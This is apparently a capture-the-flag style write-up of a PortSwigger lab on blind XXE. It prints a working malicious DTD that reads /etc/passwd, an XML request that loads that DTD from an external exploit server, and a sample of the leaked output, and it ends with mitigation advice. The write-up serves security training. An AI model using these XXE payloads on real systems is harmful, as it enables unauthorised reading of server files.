
### 📁 `README.md` — Blind XXE: Data Extraction via XML Parsing Errors

# 📛 Blind XXE: Extracting Data via Error Message with External DTD

**🧪 Lab Level:** Practitioner  
**🔐 Vulnerability:** Blind XXE + Error-based Data Disclosure  
**✅ Status:** Solved  
**🛠 Platform:** PortSwigger Web Security Academy  
**🎯 Objective:** Leak the contents of `/etc/passwd` using a crafted external DTD that triggers a parsing error message.

---

## 🔍 Lab Context

This lab simulates a **blind XXE vulnerability**, where:
- The application **does not return XML parsing output**
- External parameter entities are **allowed**
- Triggered errors can leak **parsed entity content**
- You can host a **malicious DTD** using a provided exploit server

The goal is to leak the content of `/etc/passwd` through a **forced parser error** using a crafted DTD.

---

## ⚙️ Exploitation Process

### 1. 📦 Prepare the Malicious DTD

Go to the **Exploit Server** and store this payload as a `.dtd` file:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
````

* `%file` loads the contents of `/etc/passwd`
* `%exfil` tries to use the file content as a subpath of a non-existent file → triggers an error

Click **"View exploit"** to get the hosted URL, e.g.:

```
https://exploit-server.net/malicious.dtd
```

---

### 2. 🔄 Intercept & Modify the XML Request

Navigate to a product, click **“Check stock”**, and intercept the POST request in **Burp Suite**.

Replace the XML with:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "https://exploit-server.net/malicious.dtd">
  %xxe;
]>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

---

### 3. 📉 Trigger the Error and Extract the Data

The server tries to resolve:

```
file:///invalid/[contents-of-/etc/passwd]
```

Result: the application throws a parser error, **leaking part of `/etc/passwd`** in the response.

Example:

```
Invalid path: /invalid/root:x:0:0:root:/root:/bin/bash
```

🎯 Success — blind XXE exploited via error channel!

---

## 🧠 Technical Insights

| Entity                  | Purpose                                                            |
| ----------------------- | ------------------------------------------------------------------ |
| `%file`                 | Reads `/etc/passwd`                                                |
| `%eval`                 | Creates another entity to build a malicious `file://` path         |
| `%exfil`                | Executes the payload by referencing `%file` inside an invalid path |
| `DTD hosted externally` | Bypasses internal filtering via indirection                        |

---

## 🔐 Mitigation Recommendations

* Disable **DTD processing** (`DOCTYPE`) in XML parsers
* Use **secure XML parsers** (`defusedxml`, Java’s `SAXParserFactory` with restrictions)
* Sanitize **error messages** to prevent data leaks
* Implement **content-type and schema validation** for XML inputs

---

## 📚 References

* [📘 PortSwigger: Blind XXE via Error Messages](https://portswigger.net/web-security/xxe/blind/error-message)
* [🛡️ OWASP XXE Prevention Guide](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
* [🧠 PayloadsAllTheThings – XXE Section](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)

